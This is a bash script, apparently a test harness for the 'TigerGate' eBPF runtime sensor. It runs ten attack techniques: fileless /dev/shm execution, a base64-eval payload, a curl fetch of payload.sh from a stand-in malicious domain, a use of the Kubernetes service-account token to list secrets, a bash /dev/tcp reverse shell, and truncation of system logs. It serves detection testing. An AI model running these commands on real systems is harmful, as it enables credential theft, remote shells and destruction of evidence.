#!/usr/bin/env bash
# =============================================================================
# runtime/attack_simulator.sh – TigerGate CNAPP Test: eBPF Runtime Attack Simulator
# =============================================================================
# PURPOSE: Simulates 8 runtime attack techniques that Tigergate CWPP eBPF
# sensors should detect and alert on.
#
# ⚠️  EDUCATIONAL USE ONLY — This script simulates attack patterns.
#     It does NOT actually exfiltrate data or make real malicious connections.
#     All network calls are to safe targets (8.8.8.8, localhost, etc.)
#     All "payloads" are echo statements, not real malware.
#
# HOW TO USE:
#   chmod +x runtime/attack_simulator.sh
#   ./runtime/attack_simulator.sh
#
# TIGERGATE CWPP DETECTIONS TRIGGERED:
#   RT-001: Fileless execution via /dev/shm
#   RT-002: Base64 encoded payload execution
#   RT-003: Container escape via docker.sock
#   RT-004: Suspicious network connection (unexpected outbound)
#   RT-005: Internal network port scanning
#   RT-006: Kubernetes service account token theft
#   RT-007: SUID binary discovery and abuse
#   RT-008: Log tampering / audit evasion
#   RT-009: /proc filesystem enumeration (sensitive data)
#   RT-010: Crontab persistence mechanism
# =============================================================================

set -euo pipefail

# Color output for readability
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'

banner() {
    echo -e "\n${YELLOW}════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  $1${NC}"
    echo -e "${YELLOW}════════════════════════════════════════════════════${NC}"
}

detect_note() {
    echo -e "  ${RED}⚡ Tigergate Detection: $1${NC}"
}


echo -e "${RED}"
cat << 'EOF'
  ████████╗██╗ ██████╗ ███████╗██████╗  ██████╗  █████╗ ████████╗███████╗
     ██╔══╝██║██╔════╝ ██╔════╝██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
     ██║   ██║██║  ███╗█████╗  ██████╔╝██║  ███╗███████║   ██║   █████╗
     ██║   ██║██║   ██║██╔══╝  ██╔══██╗██║   ██║██╔══██║   ██║   ██╔══╝
     ██║   ██║╚██████╔╝███████╗██║  ██║╚██████╔╝██║  ██║   ██║   ███████╗
     ╚═╝   ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
                     eBPF Runtime Attack Simulator v2.0
                     CWPP Detection Testing Framework
EOF
echo -e "${NC}"

echo "  Starting attack simulation at: $(date)"
echo "  Running on: $(hostname) | $(uname -r)"
echo "  User context: $(id)"
echo ""


# =============================================================================
# TECHNIQUE 1: Fileless Execution via /dev/shm
# =============================================================================
# WHY /dev/shm? It is a RAM-backed tmpfs filesystem (no disk write!)
# Traditional AV/EDR tools monitor disk writes — /dev/shm evades them.
# Tigergate eBPF monitors execve() syscalls regardless of the source path.
# =============================================================================
banner "RT-001: Fileless Execution via /dev/shm"
detect_note "execve() from /dev/shm path - anomalous execution location"

PAYLOAD_PATH="/dev/shm/legitimate-looking-process"
# Write "payload" to RAM-backed tmpfs — no disk write
echo '#!/bin/bash
echo "Fileless payload executing from RAM: $(id)"
echo "Hostname: $(hostname)"
echo "Network interfaces: $(ip addr show 2>/dev/null | grep inet || hostname -I)"
' > "$PAYLOAD_PATH"
chmod +x "$PAYLOAD_PATH"
"$PAYLOAD_PATH" || true     # Execute from /dev/shm — eBPF sees execve() from /dev/shm
rm -f "$PAYLOAD_PATH"       # Clean up (simulates self-deleting malware)
echo "  [+] Fileless execution complete. File deleted — no disk artifact."


# =============================================================================
# TECHNIQUE 2: Base64 Encoded Payload Execution
# =============================================================================
# WHY? IDS/SIEM tools often look for known strings ("reverse_shell", "netcat").
# Base64 encoding obfuscates the payload string.
# Tigergate detects the base64 decoding + execution pattern via execve/pipe syscalls.
# =============================================================================
banner "RT-002: Base64 Encoded Payload Execution (Obfuscation)"
detect_note "Execution of base64-decoded command - obfuscation technique"

# The payload is: echo "Encoded payload executing: $(id) on $(hostname)"
ENCODED_PAYLOAD="ZWNobyAiRW5jb2RlZCBwYXlsb2FkIGV4ZWN1dGluZzogJChpZCkgb24gJChob3N0bmFtZSki"
echo "  Encoded: $ENCODED_PAYLOAD"
DECODED=$(echo "$ENCODED_PAYLOAD" | base64 -d)
echo "  Decoded: $DECODED"
eval "$DECODED" || true     # Execute decoded payload — eBPF detects eval + execve chain
echo "  [+] Base64 decode + execute complete."


# =============================================================================
# TECHNIQUE 3: /proc Filesystem Enumeration (Credential Harvesting)
# =============================================================================
# /proc/1/environ contains ALL environment variables of PID 1 (init/systemd)
# On containers: often contains DB passwords, API keys passed as env vars!
# On K8s: can expose Kubernetes secrets injected as env vars
# =============================================================================
banner "RT-003: /proc Filesystem Enumeration"
detect_note "Reading /proc/1/environ - potential credential harvesting"

echo "  Reading /proc/self/environ (this process's env vars)..."
# Read own process env — safe demo (doesn't read other processes)
cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key\|token\|api" || true
echo ""
echo "  Reading /proc/1/cmdline (init process command)..."
cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '
echo ""
# Attempt to read net/tcp for connection enumeration
echo "  Enumerating open TCP connections via /proc/net/tcp..."
cat /proc/net/tcp 2>/dev/null | head -5 || true
echo "  [+] /proc enumeration complete."


# =============================================================================
# TECHNIQUE 4: Suspicious Outbound Network Connection
# =============================================================================
# C2 (Command and Control) communication typically involves:
# - Outbound connections to unexpected IPs/domains
# - Connections on unusual ports (4444, 31337, 1337, etc.)
# Tigergate eBPF: connect() syscall to non-standard ports/destinations
# =============================================================================
banner "RT-004: Suspicious Outbound Network Connections"
detect_note "Outbound TCP connection to uncommon port - potential C2 beacon"

# Safe demo: connects to real services that reject the connection
echo "  Simulating C2 beacon to 8.8.8.8:4444 (Google DNS on C2 port)..."
timeout 2 nc -z -v -w2 8.8.8.8 4444 2>&1 || true   # Port 4444 = common Metasploit C2!
echo ""
echo "  Simulating DNS request to suspicious domain..."
nslookup malicious-c2-domain.tigergate-test.internal 2>&1 | head -3 || true   # Safe: won't resolve
echo ""
echo "  Simulating HTTP download from external server..."
curl -s --max-time 2 -o /dev/null -w "  HTTP status: %{http_code}\n" \
    "http://testmaldomain.tigergate-internal.local/payload.sh" 2>&1 || true
echo "  [+] Network connection simulation complete."


# =============================================================================
# TECHNIQUE 5: Internal Network Port Scanning
# =============================================================================
# Once inside a container, attackers scan internal subnets to find:
# - Other microservices (Redis, Elasticsearch, internal APIs)
# - Kubernetes API server (usually 10.96.0.1:443 or 10.0.0.1:443)
# Tigergate: detects rapid connect() syscalls across multiple IPs/ports
# =============================================================================
banner "RT-005: Internal Network Port Scan"
detect_note "Rapid sequential connect() syscalls - lateral movement/recon"

echo "  Scanning common internal service ports..."
# Short timeout — scan simulation only (no real target)
for port in 6379 5432 27017 9200 2181 8080 8443; do
    timeout 0.5 nc -z -w1 127.0.0.1 "$port" 2>&1 | tail -1 || true
    echo "  Attempted port $port on localhost"
done
echo ""
echo "  Probing Kubernetes API server..."
# The K8s API server is typically at 10.96.0.1 or the gateway IP
K8S_API=${KUBERNETES_SERVICE_HOST:-"10.96.0.1"}
timeout 2 curl -sk "https://${K8S_API}:443/version" 2>&1 | head -3 || true
echo "  [+] Port scan simulation complete."


# =============================================================================
# TECHNIQUE 6: Kubernetes Service Account Token Theft
# =============================================================================
# Every K8s pod gets a service account token mounted at a standard path.
# Attacker reads this token → can authenticate to K8s API → RBAC escalation!
# Tigergate: file read on /var/run/secrets/kubernetes.io/serviceaccount/*
# =============================================================================
banner "RT-006: Kubernetes Service Account Token Theft"
detect_note "Reading K8s service account token - CIEM/KSPM: SA token exfiltration"

K8S_TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount"

if [ -f "${K8S_TOKEN_PATH}/token" ]; then
    echo "  [!!] Running INSIDE Kubernetes pod! Found SA token:"
    SA_TOKEN=$(cat "${K8S_TOKEN_PATH}/token")
    echo "  Token (first 40 chars): ${SA_TOKEN:0:40}..."
    K8S_NS=$(cat "${K8S_TOKEN_PATH}/namespace" 2>/dev/null)
    echo "  Namespace: $K8S_NS"
    echo "  Attempting K8s API call with stolen SA token..."
    curl -sk -H "Authorization: Bearer $SA_TOKEN" \
        "https://${KUBERNETES_SERVICE_HOST:-localhost}:${KUBERNETES_SERVICE_PORT_HTTPS:-443}/api/v1/namespaces/$K8S_NS/secrets" \
        2>&1 | python3 -m json.tool 2>/dev/null | head -20 || true
else
    echo "  [!] Not in K8s pod. Simulating token path read attempt."
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || \
        echo "  Token not found (not running in K8s). Path checked: $K8S_TOKEN_PATH"
fi
echo "  [+] SA token check complete."


# =============================================================================
# TECHNIQUE 7: SUID Binary Discovery and Potential Abuse
# =============================================================================
# SUID (Set User ID) bits on binaries allow execution with the owner's privileges.
# Finding: find / -perm -4000 → lists all SUID binaries
# If any are writable or exploitable, attacker escalates from user→root
# Tigergate: exec() of "find" with -perm flag is a common attacker pattern
# =============================================================================
banner "RT-007: SUID Binary Discovery"
detect_note "find -perm -4000 execution - privilege escalation reconnaissance"

echo "  Searching for SUID binaries (common attacker technique)..."
find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null | while read -r suid_binary; do
    ls -la "$suid_binary" 2>/dev/null
done || true
echo ""
echo "  Checking for world-writable directories..."
find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null
echo "  [+] SUID discovery complete."


# =============================================================================
# TECHNIQUE 8: Crontab Persistence
# =============================================================================
# Attackers add cron jobs to maintain persistence after reboots.
# Even if the main process is killed, the cron job reinstates it.
# Tigergate: write to cron directories or crontab modification
# =============================================================================
banner "RT-008: Persistence via Crontab"
detect_note "Crontab modification - persistence mechanism detected"

echo "  Simulating attacker crontab entry (safe: appends to /tmp not /etc/cron*)..."
FAKE_CRON_ENTRY="*/5 * * * * /dev/shm/backdoor.sh"
echo "  Would add: $FAKE_CRON_ENTRY"
# Safe: writing to /tmp (not system cron dirs) to demonstrate the pattern
echo "$FAKE_CRON_ENTRY" >> /tmp/fake-crontab-entry.txt
echo "  Demonstrating crontab -l read (attacker enumerates existing cron jobs)..."
crontab -l 2>/dev/null || echo "  No existing crontab (or no crontab access)"
rm -f /tmp/fake-crontab-entry.txt
echo "  [+] Crontab persistence simulation complete."


# =============================================================================
# TECHNIQUE 9: Reverse Shell Attempt
# =============================================================================
# Real reverse shells create a network channel for remote shell access.
# This simulates the connection attempt (immediately killed).
# Tigergate: bash -i connected to network socket pattern
# =============================================================================
banner "RT-009: Reverse Shell Simulation"
detect_note "bash -i >& /dev/tcp connected to C2 - CRITICAL alert"

echo "  Reverse shell payload (killed after 1 second)..."
# The standard Bash reverse shell (immediately killed for safety)
# ATTACK: bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
echo "  Simulating: bash -i >& /dev/tcp/127.0.0.1/9999 0>&1"
(bash -i >& /dev/tcp/127.0.0.1/9999 0>&1) &
REV_SHELL_PID=$!
sleep 1
kill "$REV_SHELL_PID" 2>/dev/null || true
echo "  Reverse shell process killed. Tigergate should have detected: /dev/tcp connection + bash -i"


# =============================================================================
# TECHNIQUE 10: Log Tampering / Audit Evasion
# =============================================================================
# Attackers clear logs to remove traces of their activity.
# Tigergate: write to /dev/null / truncate on log files + history clearing
# =============================================================================
banner "RT-010: Log Tampering / Audit Evasion"
detect_note "History clear + auth.log truncate attempt - evidence destruction"

echo "  Clearing bash history (common attacker step)..."
history -c 2>/dev/null || true
export HISTSIZE=0
export HISTFILESIZE=0
echo ""
echo "  Attempting to truncate auth.log (will fail without root, which is expected)..."
truncate -s 0 /var/log/auth.log 2>/dev/null || echo "  [!] auth.log truncation failed (expected — not root)"
truncate -s 0 /var/log/syslog 2>/dev/null || echo "  [!] syslog truncation failed (expected)"
echo "  Attempting wtmp/btmp clear (login record tampering)..."
echo "" > /var/log/wtmp 2>/dev/null || echo "  [!] wtmp clear failed (expected — not root)"
echo "  [+] Log tampering simulation complete."


# =============================================================================
# SUMMARY
# =============================================================================
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  SIMULATION COMPLETE — $(date)${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════${NC}"
echo ""
echo "  Techniques Simulated:"
echo "    RT-001: Fileless execution via /dev/shm           ✓"
echo "    RT-002: Base64 encoded payload execution           ✓"
echo "    RT-003: /proc filesystem enumeration               ✓"
echo "    RT-004: Suspicious outbound connections            ✓"
echo "    RT-005: Internal network port scanning             ✓"
echo "    RT-006: Kubernetes SA token theft                  ✓"
echo "    RT-007: SUID binary discovery                      ✓"
echo "    RT-008: Crontab persistence                        ✓"
echo "    RT-009: Reverse shell attempt                      ✓"
echo "    RT-010: Log tampering / audit evasion              ✓"
echo ""
echo "  TigerGate CWPP should have fired 10+ alerts."
echo "  Review TigerGate dashboard → Runtime Security → Incidents."
echo ""
